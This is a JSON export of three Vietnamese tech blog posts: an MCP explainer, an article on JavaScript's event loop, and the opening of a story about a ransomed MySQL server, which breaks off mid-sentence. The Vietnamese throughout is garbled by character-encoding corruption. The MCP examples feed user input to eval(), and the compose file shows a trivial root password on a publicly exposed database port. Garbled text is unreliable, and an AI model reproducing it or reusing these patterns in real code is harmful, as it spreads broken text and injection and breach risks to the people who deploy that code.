[
  {
    "slug": "mcp-explained",
    "content": "\n## MCP l√† c√°i qu√°i g√¨ th·∫ø?\n\nC√≥ bao gi·ªù b·∫°n th·∫Øc m·∫Øc t·∫°i sao AI nh∆∞ ChatGPT b·ªóng nhi√™n bi·∫øt **g·ªçi calculator**, **check weather**, hay **query database** ƒë∆∞·ª£c kh√¥ng? Tr∆∞·ªõc kia AI ch·ªâ bi·∫øt n√≥i chuy·ªán, gi·ªù l·∫°i bi·∫øt \"l√†m vi·ªác\" th·ª±c t·∫ø nh∆∞ th·∫ø n√†y?\n\nƒê√≥ ch√≠nh l√† nh·ªù **tool calling** - kh·∫£ nƒÉng AI g·ªçi c√°c functions b√™n ngo√†i. Nh∆∞ng m√† tool calling truy·ªÅn th·ªëng c√≥ h·∫°n ch·∫ø: AI ch·ªâ d√πng ƒë∆∞·ª£c c√°c functions **hardcoded** s·∫µn trong app.\n\nR·ªìi **Model Context Protocol (MCP)** xu·∫•t hi·ªán nh∆∞ m·ªôt \"si√™u anh h√πng\" gi·∫£i quy·∫øt v·∫•n ƒë·ªÅ n√†y! ü¶∏‚Äç‚ôÇÔ∏è\n\n<Image\n  src=\"/images/blogs/mcp-explained/mcp-architecture.png\"\n  alt=\"MCP Architecture Overview\"\n  layout=\"responsive\"\n  width={1536}\n  height={1024}\n/>\n\n## MCP = Tool Calling \"ƒÉn steroid\"\n\nN·∫øu v√≠ tool calling truy·ªÅn th·ªëng nh∆∞ m·ªôt c√°i **h·ªôp ƒë·ªì ch∆°i c·ªë ƒë·ªãnh**, th√¨ MCP l√† m·ªôt **c·ª≠a h√†ng ƒë·ªì ch∆°i kh·ªïng l·ªì** m√† AI c√≥ th·ªÉ **t·ª± shopping**!\n\n```typescript\n// Tool calling c≈©: Functions hardcoded\nconst tools = [calculate, getWeather, sendEmail]; // ‚Üê C·ªë ƒë·ªãnh!\n\n// MCP: AI t·ª± discovery tools t·ª´ servers\nconst mathServer = new MCPServer(\"math-tools\");\nconst weatherServer = new MCPServer(\"weather-api\");  \nconst emailServer = new MCPServer(\"email-service\");\n\n// AI: \"Hmm, t√¥i c·∫ßn tools g√¨ nh·ªâ?\"\nconst availableTools = await discoverAllTools(); // ‚Üê Dynamic!\n```\n\n**ƒêi·ªÉm kh√°c bi·ªát ch√≠nh:**\n- **Tool calling**: ‚ùå Static, hardcoded, limited\n- **MCP**: ‚úÖ Dynamic, discoverable, unlimited\n\n## üèóÔ∏è Ki·∫øn tr√∫c MCP - ƒê∆°n gi·∫£n m√† hi·ªáu qu·∫£\n\n<Image\n  src=\"/images/blogs/mcp-explained/mcp-architecture-flow.png\"\n  alt=\"MCP Architecture Flow\"\n  layout=\"responsive\"\n  width={1536}\n  height={1024}\n/>\n\n**MCP Host**: AI application (nh∆∞ Claude, VS Code)\n**MCP Server**: Ch∆∞∆°ng tr√¨nh cung c·∫•p tools/resources\n**MCP Protocol**: Ng√¥n ng·ªØ giao ti·∫øp chu·∫©n (JSON-RPC)\n\nKi·ªÉu nh∆∞ AI n√≥i: *\"Anh c√≥ tools g√¨ kh√¥ng?\"*\nServer tr·∫£ l·ªùi: *\"T√¥i c√≥ calculate, factorial, fibonacci ƒë√¢y!\"*\nAI: *\"Cho t√¥i x√†i c√°i calculate v·ªõi!\"* ü§ù\n\n## üéØ Ba \"anh em ru·ªôt\" c·ªßa MCP\n\n### 1. üõ†Ô∏è Tools - \"Functions AI c√≥ th·ªÉ g·ªçi\"\n\n```typescript\n// Server expose tools\nserver.registerTool(\"calculate\", {\n  description: \"T√≠nh to√°n bi·ªÉu th·ª©c to√°n h·ªçc\",\n  inputSchema: { expression: z.string() }\n}, async ({ expression }) => {\n  return { content: [{ type: \"text\", text: eval(expression) }] };\n});\n\n// AI g·ªçi tool\nawait client.callTool('calculate', { expression: '2 + 2' });\n// ‚Üí \"4\"\n```\n\n**V√≠ d·ª• tools hay c√≥:**\n- `send_email(to, subject, body)` - G·ª≠i email\n- `query_database(sql)` - Query database  \n- `get_weather(city)` - L·∫•y th√¥ng tin th·ªùi ti·∫øt\n- `create_file(path, content)` - T·∫°o file\n\n### 2. üìö Resources - \"Data AI c√≥ th·ªÉ ƒë·ªçc\"\n\n```typescript\n// Server expose resources\nawait client.readResource('file:///project/README.md');\nawait client.readResource('database://users/schema');\nawait client.readResource('api://swagger.json');\n```\n\nResources gi·ªëng nh∆∞ **API endpoints** nh∆∞ng ƒë·ªÉ ƒë·ªçc data th√¥i, kh√¥ng c√≥ side effects.\n\n**V√≠ d·ª• resources:**\n- File contents: `file:///path/to/code.js`\n- Database schemas: `db://table_info`  \n- Configuration: `config://app.json`\n- Documentation: `docs://api-guide`\n\n### 3. üí¨ Prompts - \"Templates cho AI\"\n\nƒê√¢y l√† ph·∫ßn **th√∫ v·ªã nh·∫•t**! Thay v√¨ hardcode prompts trong AI app, server c√≥ th·ªÉ cung c·∫•p **domain-specific prompts** v·ªõi expertise cao!\n\n```typescript\n// Math server bi·∫øt c√°ch prompt AI solve math problems\nserver.registerPrompt(\"solve-equation\", {\n  argsSchema: { equation: z.string(), method: z.string() }\n}, ({ equation, method }) => ({\n  messages: [{\n    role: \"user\",\n    content: {\n      type: \"text\", \n      text: `\nSolve this equation step by step: ${equation}\n\nUse ${method} method. Show:\n1. Original equation\n2. Step-by-step solution  \n3. Final answer\n4. Verification\n\nRemember to explain each algebraic manipulation clearly.\n      `\n    }\n  }]\n}));\n```\n\n**T·∫°i sao prompts quan tr·ªçng?**\n- **Domain expertise**: Math server bi·∫øt c√°ch prompt solve math, DB server bi·∫øt prompt optimize queries\n- **Context-rich**: Server c√≥ th·ªÉ build prompts v·ªõi domain knowledge s√¢u\n- **Consistent**: Standardized prompting approach across tools\n\n<Image\n  src=\"/images/blogs/mcp-explained/mcp-prompts-flow.png\"\n  alt=\"MCP Prompts Flow\"\n  layout=\"responsive\"\n  width={512}\n  height={768}\n/>\n\n## üöÄ MCP ho·∫°t ƒë·ªông nh∆∞ th·∫ø n√†o?\n\n### Phase 1: Discovery\n```typescript\n// AI: \"T√¥i mu·ªën bi·∫øt b·∫°n c√≥ g√¨?\"\nconst tools = await client.listTools();\nconst resources = await client.listResources();\nconst prompts = await client.listPrompts();\n\n// Server: \"T√¥i c√≥ nh·ªØng n√†y ƒë√¢y!\"\n// Tools: [calculate, send_email, query_db]\n// Resources: [file://, database://, config://]\n// Prompts: [solve-equation, debug-code, optimize-query]\n```\n\n### Phase 2: Execution\n```typescript\n// AI quy·∫øt ƒë·ªãnh: \"T√¥i c·∫ßn t√≠nh to√°n!\"\nconst result = await client.callTool('calculate', {\n  expression: 'Math.sqrt(16) + Math.PI'\n});\n// ‚Üí \"7.141592653589793\"\n\n// AI: \"T√¥i c·∫ßn ƒë·ªçc file!\"\nconst content = await client.readResource('file:///README.md');\n// ‚Üí File content\n\n// AI: \"T√¥i c·∫ßn prompt hay ƒë·ªÉ debug!\"\nconst debugPrompt = await client.getPrompt('debug-code', {\n  error: 'TypeError: Cannot read property of undefined',\n  code: '...'\n});\n// ‚Üí Structured prompt v·ªõi debugging best practices\n```\n\n### Phase 3: Real-time Updates\n```typescript\n// Server th√¥ng b√°o: \"T√¥i c√≥ tools m·ªõi!\"\nserver.notify('tools/list_changed');\n\n// AI t·ª± ƒë·ªông refresh v√† discover tools m·ªõi\nconst newTools = await client.listTools();\n```\n\n## üî• Real-world Example\n\nT∆∞·ªüng t∆∞·ª£ng b·∫°n ƒëang l√†m vi·ªác trong **VS Code** v·ªõi MCP:\n\n```typescript\nconst client = new MCPClient();\n\n// K·∫øt n·ªëi multiple servers\nawait client.connect('node', ['./file-server.js']);     // File operations\nawait client.connect('node', ['./db-server.js']);       // Database access\nawait client.connect('node', ['./git-server.js']);      // Git operations\nawait client.connect('node', ['./api-server.js']);      // API testing\n\n// B√¢y gi·ªù AI c√≥ th·ªÉ:\n// 1. List files trong project\nconst files = await client.callTool('list_files', {pattern: '*.ts'});\n\n// 2. ƒê·ªçc source code  \nconst code = await client.readResource('file:///src/main.ts');\n\n// 3. Query database ƒë·ªÉ hi·ªÉu data structure\nconst schema = await client.callTool('describe_table', {table: 'users'});\n\n// 4. Check git history\nconst commits = await client.callTool('git_log', {limit: 10});\n\n// 5. Test API endpoints\nconst apiResult = await client.callTool('test_endpoint', {\n  url: '/api/users', method: 'GET'\n});\n\n// 6. S·ª≠ d·ª•ng specialized prompts\nconst codeReview = await client.getPrompt('code-review', {\n  code: code, framework: 'React', type: 'component'\n});\n```\n\n**Result**: AI c√≥ **full context** v·ªÅ project v√† c√≥ th·ªÉ th·ª±c hi·ªán complex tasks! üöÄ\n\n![MCP Real World Example](/images/blogs/mcp-explained/mcp-real-world.png)\n\n## üÜö MCP vs REST API - S·ª± kh√°c bi·ªát\n\n| REST API | MCP |\n|----------|-----|\n| HTTP requests | JSON-RPC messages |\n| Custom endpoints | Standardized methods (`tools/list`, `tools/call`) |\n| Manual integration | Auto-discovery |\n| Human developers | AI agents |\n| Static documentation | Dynamic capability negotiation |\n\n**ƒêi·ªÉm m·∫•u ch·ªët**: REST API design cho con ng∆∞·ªùi, MCP design cho AI! ü§ñ\n\n## üé≠ T·∫°i sao MCP \"ƒë·ªânh\" th·∫ø?\n\n### 1. üîå Pluggable Architecture\n```typescript\n// D·ªÖ d√†ng th√™m/b·ªõt capabilities\nawait addServer('./new-awesome-server.js');\nawait removeServer('./old-server.js');\n// AI t·ª± ƒë·ªông adapt v·ªõi tools m·ªõi!\n```\n\n### 2. üåê Network-native\n```typescript\n// Local servers\nawait client.connect('node', ['./local-server.js']);\n\n// Remote servers  \nawait client.connect('http://api.example.com/mcp');\n```\n\n### 3. üìè Standardization\nT·∫•t c·∫£ MCP servers ƒë·ªÅu c√≥ **same interface**:\n- `tools/list` - List available tools\n- `tools/call` - Execute a tool\n- `resources/list` - List available resources  \n- `resources/read` - Read resource content\n- `prompts/list` - List available prompts\n- `prompts/get` - Get prompt template\n\n### 4. üîÑ Dynamic & Real-time\n```typescript\n// Server c√≥ th·ªÉ update capabilities runtime\nserver.addTool('new_feature', ...);\nserver.notify('tools/list_changed');\n// AI t·ª± ƒë·ªông bi·∫øt v√† s·ª≠ d·ª•ng ngay!\n```\n\n### 5. üéØ Specialized Domains\nM·ªói server focus v√†o **expertise ri√™ng**:\n- **Math server**: Advanced calculations, equation solving\n- **Database server**: Query optimization, schema analysis\n- **Git server**: Version control operations\n- **API server**: HTTP testing, documentation generation\n\n## üõ†Ô∏è Implement MCP Server ƒë∆°n gi·∫£n\n\n```typescript\nimport { McpServer } from \"@modelcontextprotocol/sdk/server/mcp.js\";\nimport { StdioServerTransport } from \"@modelcontextprotocol/sdk/server/stdio.js\";\n\nconst server = new McpServer({\n  name: \"my-awesome-server\",\n  version: \"1.0.0\"\n});\n\n// Add a calculator tool\nserver.registerTool(\"calculate\", {\n  title: \"Calculator\",\n  description: \"Evaluate mathematical expressions\",\n  inputSchema: { expression: z.string() }\n}, async ({ expression }) => ({\n  content: [{ type: \"text\", text: String(eval(expression)) }]\n}));\n\n// Add a resource  \nserver.registerResource(\"config\", \"config://app\", {\n  title: \"App Configuration\"\n}, async () => ({\n  contents: [{ \n    uri: \"config://app\",\n    text: JSON.stringify({ env: \"production\", debug: false })\n  }]\n}));\n\n// Add a prompt\nserver.registerPrompt(\"debug-helper\", {\n  title: \"Debug Assistant\",\n  argsSchema: { error: z.string(), code: z.string() }\n}, ({ error, code }) => ({\n  messages: [{\n    role: \"user\",\n    content: { \n      type: \"text\",\n      text: `Help me debug this error:\\n\\nError: ${error}\\n\\nCode:\\n${code}\\n\\nProvide step-by-step debugging approach.`\n    }\n  }]\n}));\n\n// Start server\nconst transport = new StdioServerTransport();\nawait server.connect(transport);\nconsole.log(\"üöÄ MCP Server running!\");\n```\n\n**3 d√≤ng code ƒë·ªÉ t·∫°o MCP client:**\n```typescript\nimport { MCPClient } from './client.js';\n\nconst client = new MCPClient();\nawait client.connect('node', ['./my-server.js']);\nconst result = await client.callTool('calculate', { expression: '2 + 2' });\n```\n\nEasy peasy! üç∞\n\n## üîÆ T∆∞∆°ng lai c·ªßa MCP\n\nMCP m·ªü ra **infinite possibilities**:\n\n- **üè† Smart Home**: AI control IoT devices qua MCP servers\n- **üè¢ Enterprise**: AI access internal systems safely  \n- **üéÆ Gaming**: AI interact v·ªõi game engines\n- **üî¨ Research**: AI orchestrate complex workflows\n- **üé® Creative**: AI access design tools v√† art platforms\n\n**T∆∞·ªüng t∆∞·ª£ng**: AI c√≥ th·ªÉ k·∫øt n·ªëi v·ªõi **m·ªçi th·ª©** m√† v·∫´n **secure** v√† **standardized**! ü§Ø\n\n## üéØ K·∫øt lu·∫≠n\n\nMCP kh√¥ng ch·ªâ l√† m·ªôt giao th·ª©c - n√≥ l√† **paradigm shift** trong c√°ch AI interact v·ªõi external world!\n\n**Key takeaways:**\n- ‚úÖ MCP = Tool calling n√¢ng c·∫•p v·ªõi dynamic discovery\n- ‚úÖ 3 primitives: Tools (actions), Resources (data), Prompts (templates)  \n- ‚úÖ Standardized interface nh∆∞ng flexible implementation\n- ‚úÖ Real-time updates v√† pluggable architecture\n- ‚úÖ Design cho AI agents, not human developers\n\n**Bottom line**: N·∫øu tool calling l√† **\"AI bi·∫øt g·ªçi function\"**, th√¨ MCP l√† **\"AI bi·∫øt shopping for superpowers\"**! üõçÔ∏è‚ö°\n\nT·ª´ gi·ªù, thay v√¨ h·ªèi *\"AI c√≥ th·ªÉ l√†m g√¨?\"*, ch√∫ng ta s·∫Ω h·ªèi *\"AI **kh√¥ng th·ªÉ** l√†m g√¨?\"* üòè\n\n---\n\n*P/S: B√†i vi·∫øt n√†y ƒë∆∞·ª£c vi·∫øt v·ªõi s·ª± h·ªó tr·ª£ c·ªßa MCP... √† kh√¥ng, v·ªõi s·ª± h·ªó tr·ª£ c·ªßa cafein v√† passion cho technology! ‚òïÔ∏è*\n\n![MCP Future Vision](/images/blogs/mcp-explained/mcp-future.png)\n",
    "title": "MCP - Model Context Protocol: Khi AI bi·∫øt 'g·ªçi ngo·∫°i binh'",
    "publishedAt": "2025-08-04",
    "image": "/images/blogs/mcp-explained/thumbnail.png",
    "summary": "T·ª´ng nghe thu·∫≠t ng·ªØ MCP nh∆∞ng ch∆∞a hi·ªÉu r√µ? B√†i n√†y s·∫Ω gi·∫£i th√≠ch MCP - giao th·ª©c gi√∫p AI 'm·ªü r·ªông v≈© tr·ª•' b·∫±ng c√°ch k·∫øt n·ªëi v·ªõi external tools v√† resources. T·ª´ tool calling c∆° b·∫£n ƒë·∫øn MCP advanced, all in m·ªôt b√†i!",
    "tags": [
      "AI"
    ],
    "featured": true,
    "readTime": "10 min read",
    "author": "Larry Vu"
  },
  {
    "slug": "javascript-co-thuc-su-don-luong",
    "content": "M·ªôt c√¢u h·ªèi kh√° th√∫ v·ªã v·ªÅ JavaScript l√†: ‚ÄúLi·ªáu n√≥ c√≥ th·ª±c s·ª± ƒë∆°n lu·ªìng kh√¥ng nh·ªâ? N·∫øu ƒë∆°n lu·ªìng th√¨ t·∫°i sao v·∫´n c√≥ nh·ªØng t√°c v·ª• b·∫•t ƒë·ªìng b·ªô (async task) nh∆∞ setTimeout, fetch hay Promise?‚Äù Nghe c√≥ v·∫ª h∆°i m√¢u thu·∫´n ƒë√∫ng kh√¥ng? C√πng m√¨nh t√¨m hi·ªÉu xem th·ª±c ch·∫•t JavaScript ho·∫°t ƒë·ªông nh∆∞ th·∫ø n√†o nh√©!\n\n## JavaScript ‚Äúƒë∆°n lu·ªìng‚Äù l√† sao?\n\nTr∆∞·ªõc h·∫øt, khi n√≥i JavaScript l√† ‚Äúƒë∆°n lu·ªìng‚Äù, √Ω l√† g√¨? ƒê∆°n gi·∫£n, n√≥ ch·ªâ c√≥ m·ªôt lu·ªìng th·ª±c thi ch√≠nh ‚Äì t·ª©c l√† t·∫°i m·ªôt th·ªùi ƒëi·ªÉm, ch·ªâ c√≥ m·ªôt ƒëo·∫°n m√£ JavaScript ƒë∆∞·ª£c ch·∫°y tr√™n call stack. ƒêi·ªÅu n√†y gi√∫p m·ªçi th·ª© tr·ªü n√™n d·ªÖ d·ª± ƒëo√°n, kh√¥ng lo hai ƒëo·∫°n code ‚Äúgi√†nh nhau‚Äù t√†i nguy√™n nh∆∞ c√°c ng√¥n ng·ªØ ƒëa lu·ªìng kh√°c.\n\nNh∆∞ng m√†, n·∫øu ch·ªâ c√≥ m·ªôt lu·ªìng, t·∫°i sao nh·ªØng th·ª© nh∆∞ setTimeout, fetch, hay Promise l·∫°i c√≥ th·ªÉ ‚Äúch·∫°y song song‚Äù m√† kh√¥ng l√†m ƒë·ª©ng tr√¨nh duy·ªát? ƒê√≥ l√† nh·ªù v√†o c∆° ch·∫ø b·∫•t ƒë·ªìng b·ªô (asynchronous) v√† event loop th·∫ßn th√°nh c·ªßa JavaScript.\n\n## Event Loop ‚Äì ‚Äú·∫£o thu·∫≠t gia‚Äù ƒë·ª©ng sau m·ªçi th·ª©\n\nTr∆∞·ªõc h·∫øt ta c·∫ßn l√†m quen c√°c kh√°i ni·ªám sau: \n- Callstack: M·ªôt stack c√°c function ƒë∆∞·ª£c g·ªçi. Khi m·ªôt function ƒë∆∞·ª£c g·ªçi, n√≥ s·∫Ω ƒë∆∞·ª£c x·∫øp v√†o ƒë√¢y, v√† s·∫Ω ho·∫°t ƒë·ªông theo nguy√™n t·∫Øc LIFO\n- Callback queue: M·ªôt h√†ng ƒë·ª£i c√°c callback ch·ªù ƒë∆∞·ª£c th·ª±c thi\n\nR·ªìi, b√¢y gi·ªù h√£y t∆∞·ªüng t∆∞·ª£ng JavaScript nh∆∞ m·ªôt ƒë·∫ßu b·∫øp ch·ªâ c√≥ m·ªôt tay (call stack) ƒë·∫ßu b·∫øp n√†y s·∫Ω th·ª±c hi·ªán tu·∫ßn t·ª± c√°c c√¥ng vi·ªác ƒë∆∞·ª£c list ra t·ª´ tr√™n xu·ªëng d∆∞·ªõi (th·ª© t·ª± c√°c d√≤ng code c·ªßa b·∫°n)\nNh∆∞ng v·ªã ƒë·∫ßu b·∫øp n√†y l·∫°i c√≥ r·∫•t nhi·ªÅu tr·ª£ l√Ω (Web APIs, Browser APIs, th∆∞ vi·ªán libuv c·ªßa Nodejs). Khi b·∫°n g·ªçi setTimeout ho·∫∑c fetch, ƒë·∫ßu b·∫øp s·∫Ω ‚Äúgiao vi·ªác‚Äù cho tr·ª£ l√Ω, r·ªìi ti·∫øp t·ª•c n·∫•u c√°c m√≥n kh√°c. \nNh∆∞ v·∫≠y, ng∆∞·ªùi th·ª±c hi·ªán c√°c t√°c v·ª• nh∆∞ ƒë·∫øm th·ªùi gian, g·ªçi api b·∫£n ch·∫•t kh√¥ng ph·∫£i ƒë·∫ßu b·∫øp (JavaScript) m√† l√† c√°c tr·ª£ l√Ω.\n\nKhi tr·ª£ l√Ω l√†m xong, h·ªç s·∫Ω b√°o l·∫°i cho ƒë·∫ßu b·∫øp (ch√≠nh l√† c√°ch ƒë∆∞a c√°c callback v√†o queue), v√† ƒë·∫ßu b·∫øp s·∫Ω x·ª≠ l√Ω nh·ªØng vi·ªác c√≤n l·∫°i (callback) ti·∫øp khi khi m√† ƒë·∫ßu b·∫øp ƒë√£ l√†m xong c√°c vi·ªác trong list ban ƒë·∫ßu.\n\nCh√≠nh v√¨ v·∫≠y, c√°c c√¥ng vi·ªác c√≤n l·∫°i (callbacks) ph·∫£i ch·ªù ƒë·∫ßu b·∫øp l√†m xong c√°c m√≥n ch√≠nh ƒë√£.\n\nC∆° ch·∫ø n√†y g·ªçi l√† event loop. N√≥ gi√∫p JavaScript x·ª≠ l√Ω c√°c t√°c v·ª• b·∫•t ƒë·ªìng b·ªô m√† kh√¥ng c·∫ßn ph·∫£i t·∫°o th√™m lu·ªìng m·ªõi. Nh·ªù v·∫≠y, giao di·ªán web v·∫´n m∆∞·ª£t m√†, kh√¥ng b·ªã ‚Äúƒë∆°‚Äù khi ch·ªù d·ªØ li·ªáu t·ª´ server hay c√°c t√°c v·ª• t·ªën th·ªùi gian.\n\nM√¨nh s·∫Ω ƒë·ªÉ bi·ªÉu ƒë·ªì flow ·ªü d∆∞·ªõi c√πng c·ªßa blog cho c√°c b·∫°n n√†o mu·ªën tham kh·∫£o nh√© :v\n\nCh√≠nh v√¨ c√°c task n·∫∑ng sau khi ƒë∆∞·ª£c th·ª±c hi·ªán xong, callback c·ªßa n√≥ s·∫Ω ƒë∆∞·ª£c ƒë·∫©y v√†o 1 c√°i queue, ch·ªù khi n√†o callstack r·∫£nh th√¨ m·ªõi ƒë∆∞·ª£c th·ª±c hi·ªán. M√¨nh ƒë√£ nh·∫≠n th·∫•y ra m·ªôt ƒëi·ªÅu kh√° th√∫ v·ªã: r·∫±ng setTimeout s·∫Ω th·ª±c s·ª± kh√¥ng chu·∫©n.\n\nN·∫øu th·ªùi gian c·ªßa setTimeout h·∫øt, m√† trong callstack v·∫´n c√≤n function ƒëang ƒë∆∞·ª£c th·ª±c thi, th√¨ n√≥ s·∫Ω ph·∫£i ch·ªù, m√† n·∫øu function ƒë√≥ c≈©ng r·∫•t t·ªën th·ªùi gian th√¨ s·∫Ω ph·∫£i ch·ªù c√†ng l√¢u.\n\nM√¨nh c√πng th·ª≠ nh√©, m√¨nh s·∫Ω cho ch·∫°y m·ªôt t·ªâ v√≤ng l·∫∑p xem sao: \n```html\nconst start = Date.now();\n\nsetTimeout(() => {\n  console.log('Delay:', Date.now() - start, 'ms');\n}, 0);\n\nfor (let i = 0; i < 1_000_000_000; i++) {}\n```\n\nƒê·∫ßu b·∫øp n√†y, ch·ªâ giao m·ªôt vi·ªác r·∫•t r·∫•t c·ªèn con cho tr·ª£ l√Ω th√¥i, r·ªìi √¥ng ta ti·∫øp t·ª•c bƒÉm th·ªãt 1 t·ªâ l·∫ßn.\nTheo l√Ω thuy·∫øt, c√¥ng vi·ªác ƒë·∫øm th·ªùi gian kia m·∫•t 0s cho tr·ª£ l√Ω th·ª±c hi·ªán, r·ªìi √¥ng ƒë·∫ßu b·∫øp s·∫Ω in ra ƒë·ªô tr·ªÖ. C√πng xem k·∫øt qu·∫£ th·ª±c t·∫ø nh√©:\n\n<Image\n  src=\"/images/blogs/js-co-thuc-su-don-luong/test.png\"\n  alt=\"Test result\"\n  layout=\"responsive\"\n  width={358}\n  height={169}\n/>\n\nTr·ªÖ c√≥ 0,3s th√¥i sao, th·ª≠ tƒÉng l√™n 10 t·ªâ xem sao :))) :\n\n<Image\n  src=\"/images/blogs/js-co-thuc-su-don-luong/test2.png\"\n  alt=\"Test result 2\"\n  layout=\"responsive\"\n  width={358}\n  height={169}\n/>\n\n\nTh·∫•y ch·ª©, h√†m `console.log('Delay:', Date.now() - start, 'ms');` ƒë√£ th·ª±c s·ª± ƒë·ª£i 10 t·ªâ v√≤ng l·∫∑p xong m·ªõi ƒë∆∞·ª£c th·ª±c thi\n\nK·∫øt qu·∫£\n\n## V·∫≠y JavaScript c√≥ th·ª±c s·ª± ƒë∆°n lu·ªìng kh√¥ng?\n\nC√¢u tr·∫£ l·ªùi l√†: ƒê√∫ng v√†‚Ä¶ kh√¥ng h·∫≥n! Engine JavaScript (v√≠ d·ª• V8 c·ªßa Chrome) ch·ªâ c√≥ m·ªôt call stack, n√™n v·ªÅ b·∫£n ch·∫•t l√† ƒë∆°n lu·ªìng. Nh∆∞ng m√¥i tr∆∞·ªùng th·ª±c thi (tr√¨nh duy·ªát ho·∫∑c Node.js) l·∫°i cung c·∫•p c√°c API ch·∫°y song song ·ªü ‚Äúh·∫≠u tr∆∞·ªùng‚Äù. Khi c√°c t√°c v·ª• n√†y ho√†n th√†nh, ch√∫ng m·ªõi ƒë∆∞·ª£c ƒë·∫©y v√†o h√†ng ƒë·ª£i (queue) ƒë·ªÉ JavaScript x·ª≠ l√Ω ti·∫øp.\n\n## T·ªïng k·∫øt\n\nT√≥m l·∫°i, JavaScript ƒë∆°n lu·ªìng ·ªü m·ª©c engine, nh∆∞ng nh·ªù event loop v√† c√°c API c·ªßa m√¥i tr∆∞·ªùng, n√≥ v·∫´n c√≥ th·ªÉ x·ª≠ l√Ω nhi·ªÅu vi·ªác ‚Äúg·∫ßn nh∆∞ song song‚Äù. V·∫≠y n√™n, ƒë·ª´ng qu√° lo l·∫Øng v·ªÅ ‚Äúƒë∆°n lu·ªìng‚Äù ‚Äì ch·ªâ c·∫ßn hi·ªÉu c√°ch ho·∫°t ƒë·ªông, b·∫°n s·∫Ω t·∫≠n d·ª•ng ƒë∆∞·ª£c s·ª©c m·∫°nh th·∫≠t s·ª± c·ªßa JavaScript!\n\nD∆∞·ªõi ƒë√¢y l√† bi·ªÉu ƒë·ªì minh h·ªça cho qu√° tr√¨nh ch·∫°y th·ª±c s·ª± c·ªßa JavaScript tr√™n m√¥i tr∆∞·ªùng Nodejs:\n\n<Image\n  src=\"/images/blogs/js-co-thuc-su-don-luong/chart.png\"\n  alt=\"Flow chart\"\n  layout=\"responsive\"\n  width={605}\n  height={855}\n/>\n---",
    "title": "JavaScript c√≥ th·ª±c s·ª± ƒë∆°n lu·ªìng?",
    "publishedAt": "2025-07-14",
    "image": "/images/blogs/duo-boot-win-vs-ubuntu/thumbnails.png",
    "summary": "JavaScript ch·ªâ c√≥ m·ªôt lu·ªìng th·ª±c thi ch√≠nh, nh∆∞ng nh·ªù event loop v√† c√°c API m√¥i tr∆∞·ªùng, n√≥ v·∫´n x·ª≠ l√Ω ƒë∆∞·ª£c nhi·ªÅu t√°c v·ª• b·∫•t ƒë·ªìng b·ªô m√† kh√¥ng b·ªã \"ƒë∆°\". B√†i vi·∫øt gi·∫£i th√≠ch c∆° ch·∫ø n√†y qua v√≠ d·ª• th·ª±c t·∫ø v√† h√¨nh minh h·ªça.",
    "tags": [
      "Q&A"
    ],
    "featured": true,
    "readTime": "15 min read",
    "author": "Larry Vu"
  },
  {
    "slug": "mysql-server-cua-toi-da-bi-tan-cong",
    "content": "## Chuy·ªán n√†y ƒë√£ x·∫£y ra m·ªôt v√†i l·∫ßn tr∆∞·ªõc ƒë√¢y, nh∆∞ng t·ªõi t·∫≠n h√¥m nay t√¥i m·ªõi t√¨m ƒë∆∞·ª£c nguy√™n nh√¢n \"c√≥ v·∫ª\" nh∆∞ l√† th·ª±c s·ª±\n\nV√†o m·ªôt ng√†y ƒë·∫πp tr·ªùi, t√¥i ƒëang chu·∫©n b·ªã ti·∫øp t·ª•c code ƒë·ªì √°n tr√™n ƒëi·ªán tho·∫°i th√¨ b√πm! T·∫•t c·∫£ API ƒë·ªÅu die s·∫°ch, kh√¥ng th·ªÉ truy c·∫≠p ƒë∆∞·ª£c g√¨.\n\nT√¥i nhanh ch√≥ng SSH v√†o server, check logs c·ªßa backend v√† th·∫•y th√¥ng b√°o l·∫° th·∫ø n√†y:\n\n<Image\n  src=\"/images/blogs/mysql-lost-data/img1.png\"\n  alt=\"Backend log th√¥ng b√°o l·ªói k·∫øt n·ªëi database\"\n  layout=\"responsive\"\n  width={741}\n  height={179}\n/>\n\nT√¥i ki·ªÉu \"????\". L√†m th·∫ø n√†o m√† database l·∫°i bi·∫øn m·∫•t ƒë∆∞·ª£c nh·ªâ? R√µ r√†ng trong docker-compose.yml t√¥i ƒë√£ bind mount volume ƒë√†ng ho√†ng m√†:\n\n```yml\nservices:\n  db:\n    image: mysql:8\n    restart: always\n    environment:\n      MYSQL_ROOT_PASSWORD: 12345678\n      MYSQL_DATABASE: intel-money\n    volumes:\n      - db_data:/var/lib/mysql\n    ports:\n      - \"3306:3306\"\n    container_name: mysql-db\n    ...\n\nvolumes:\n  db_data:\n```\n\nCh∆∞a tin v√†o m·∫Øt m√¨nh, t√¥i ti·∫øp t·ª•c truy c·∫≠p v√†o container ƒë·ªÉ ki·ªÉm tra tr·ª±c ti·∫øp:\n\n`docker exec -it mysql-db mysql -u root -p`\n\nSau ƒë√≥ li·ªát k√™ danh s√°ch database:\n\n`show databases;`\n\nV√† ƒë√¢y l√† l√∫c t√¥i ch√∫ √Ω t·ªõi m·ªôt database l·∫° ho·∫Øc: `RECOVER_YOUR_DATA`:\n\n```terminal\nmysql> show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| RECOVER_YOUR_DATA  |\n| information_schema |\n| mysql              |\n| performance_schema |\n| sys                |\n+--------------------+\n5 rows in set (0.01 sec)\n```\n\nTh·ª±c ra ƒë√¢y kh√¥ng ph·∫£i l·∫ßn ƒë·∫ßu t√¥i g·∫∑p ph·∫£i t√¨nh tr·∫°ng n√†y. Tr∆∞·ªõc ƒë√¢y c≈©ng ƒë√£ x·∫£y ra v√†i l·∫ßn, c·ª© kho·∫£ng 3-4 ng√†y l√† database l·∫°i \"bay m√†u\" m·ªôt l·∫ßn. Nh∆∞ng l√∫c ƒë√≥ t√¥i ch·ªâ restore l·∫°i data m√† kh√¥ng th·ª±c s·ª± t√¨m hi·ªÉu ƒë∆∞·ª£c ch√≠nh x√°c nguy√™n nh√¢n g·ªëc g√°c. L·∫ßn n√†y th√¨ t√¥i ƒë√£ qu√° b·ª±c m√¨nh r·ªìi!\n\nT√¥i quy·∫øt ƒë·ªãnh ki·ªÉm tra k·ªπ database l·∫° n√†y xem c√≥ g√¨. Ti·∫øp t·ª•c truy v·∫•n:\n\n```terminal\nmysql> use RECOVER_YOUR_DATA;\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nDatabase changed\nmysql> show tables;\n+-----------------------------+\n| Tables_in_RECOVER_YOUR_DATA |\n+-----------------------------+\n| RECOVER_YOUR_DATA           |\n+-----------------------------+\n1 row in set (0.00 sec)\n```\n\nV√† khi ki·ªÉm tra n·ªôi dung c·ªßa table n√†y th√¨... B√πmmmmm! 